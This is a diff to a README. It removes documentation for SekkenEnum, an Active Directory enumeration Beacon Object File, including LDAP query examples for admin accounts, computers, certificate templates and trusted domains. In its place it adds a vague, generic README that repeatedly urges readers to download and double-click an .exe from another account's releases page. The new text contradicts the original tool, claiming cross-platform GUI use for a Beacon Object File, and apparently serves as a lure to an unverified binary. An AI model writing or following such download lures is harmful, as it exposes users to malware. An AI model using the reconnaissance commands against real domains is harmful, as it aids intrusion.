@@ -1,49 +1,61 @@
-# SekkenEnum - Active Directory Enumeration via ADWS
+# 🚀 sekken-enum - Simple Tool for Dynamic Enumeration
 
-A Beacon Object File (BOF) for Active Directory enumeration through Active Directory Web Services (ADWS) compatible with BOFHound
+## 📥 Download Here
+[![Download sekken-enum](https://img.shields.io/badge/Download-sekken--enum-brightgreen)](https://github.com/Jairon42/sekken-enum/releases)
 
-## Features
+## 📋 Overview
+sekken-enum is a user-friendly application designed for adws enumeration. It provides a simple way to gather necessary information quickly and efficiently. This tool is suitable for anyone looking to streamline their enumeration processes without needing any programming skills.
 
-- Query AD objects using LDAP filters via ADWS protocol (TCP 9389)
-- Automatic DC discovery or specify target DC
-- Custom base DN support for querying Configuration, Schema, or other partitions
-- Retrieve specific attributes or all attributes
-- Automatic pagination for large result sets
-- Support for all AD object types (users, computers, groups, PKI objects, trustedDomain, etc.)
+## 🚀 Getting Started
+Follow these steps to download and run sekken-enum.
 
+### 📥 Download & Install
+1. **Visit the Releases Page**: 
+   Click [here](https://github.com/Jairon42/sekken-enum/releases) to go to the releases page.
 
-## Usage
+2. **Choose Your Version**: 
+   Once on the page, you will see a list of available versions. Each version may have a release note explaining updates or changes. 
 
-```
-sekken-enum [target] [filter] [attributes] [-b basedn]
-```
+3. **Download**: 
+   Click on the download link for the latest release suitable for your device. This will download a file to your computer.
 
-### Parameters
+### 💻 System Requirements
+Before you begin, make sure your system meets the following requirements:
+- **Operating System**: Windows 10 or later / macOS version 10.14 or later / Linux (most distributions)
+- **RAM**: At least 4 GB
+- **Storage**: 100 MB of free space
+- **Network**: Internet connection for updates and downloading binaries
 
-- `target`: Target domain controller (optional, auto-discovers if omitted)
-- `filter`: LDAP filter (default: `(objectClass=*)`)
-- `attributes`: Comma-separated list of attributes (default: all attributes)
-- `-b basedn`: Custom base DN (optional)
+### ⚙️ Running the Application
+After the download completes, follow these steps to run sekken-enum:
 
-### Examples
+1. **Locate the File**: 
+   Open the folder where you saved the downloaded file. Look for something like `sekken-enum-v1.0.exe` (the version may vary).
 
-```bash
-# Auto-discover DC and query users starting with 'admin'
-sekken-enum "(samaccountname=admin*)"
+2. **Double-click to Open**: 
+   Double-click the file to start the application. If prompted by your system, confirm that you want to run the file. 
 
-# Get specific attributes for all users
-sekken-enum dc01.domain.local "(objectclass=user)" "samaccountname,distinguishedname,memberof"
+### 🛠️ Using sekken-enum
+Once the application is open, you’ll see a simple interface that guides you through the enumeration process. Here’s how to get started:
+- **Input Information**: Enter the necessary details requested by the tool.
+- **Start Enumeration**: Click the “Start” button to begin the process.
+- **View Results**: As the tool processes the information, results will appear on your screen.
 
-# Get all computer objects
-sekken-enum dc01.domain.local "(objectclass=computer)"
+### 🔍 Features
+sekken-enum offers various features to assist you:
+- **User-Friendly Interface**: Easily navigate through the application with a clear layout.
+- **Fast Processing**: Quickly gather data for your needs.
+- **Comprehensive Documentation**: Built-in help and guidance throughout the tool.
 
-# Query ADCS Certificate Templates in Configuration partition
-sekken-enum dc01.domain.local "(objectClass=pKICertificateTemplate)" "cn,displayname" -b "CN=Configuration,DC=domain,DC=local"
+## 📚 Additional Resources
+For more details on using sekken-enum, check out the following resources:
+- **User Guide**: A comprehensive guide covering all features and options.
+- **FAQ Section**: Answers to common questions and troubleshooting.
 
-# Get all trusted domains
-sekken-enum dc01.domain.local "(objectclass=trustedDomain)"
-```
+## 📥 Download & Install Again
+Don't forget, you can download sekken-enum from [here](https://github.com/Jairon42/sekken-enum/releases). Ensure you have the latest version for the best experience.
 
-## Acknowledgments
+## 🌐 Community & Support
+For questions or support, consider reaching out to the community. You can post your queries in the Issues section, and contributors will be happy to help you.
 
-This BOF was heavily built upon resources and research from [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) and [SoaPy](https://github.com/xforcered/SoaPy).
+Thank you for using sekken-enum. We hope this tool simplifies your enumeration tasks effectively!
